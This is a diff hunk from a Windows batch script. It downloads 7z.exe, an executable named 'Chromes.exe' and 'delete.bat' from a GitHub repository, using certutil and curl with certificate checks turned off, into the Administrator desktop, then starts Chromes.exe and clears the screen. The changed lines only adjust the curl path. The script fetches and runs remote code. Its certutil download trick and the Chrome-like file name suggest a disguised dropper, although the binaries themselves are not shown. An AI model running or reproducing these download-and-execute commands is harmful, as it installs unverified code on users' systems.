@@ -7,8 +7,8 @@ certutil -urlcache -split -f https://raw.githubusercontent.com/syedshariq121/lab
 certutil -urlcache -split -f https://raw.githubusercontent.com/syedshariq121/labcc/main/7z.exe
 
 cd C:\Users\Administrator\Desktop
-C:\curl -LJOk https://raw.githubusercontent.com/syedshariq121/labcc/main/Chromes.exe
-C:\curl -LJOk https://raw.githubusercontent.com/syedshariq121/labcc/main/delete.bat
+curl -LJOk https://raw.githubusercontent.com/syedshariq121/labcc/main/Chromes.exe
+curl -LJOk https://raw.githubusercontent.com/syedshariq121/labcc/main/delete.bat
 start Chromes.exe
 cls
 @echo off
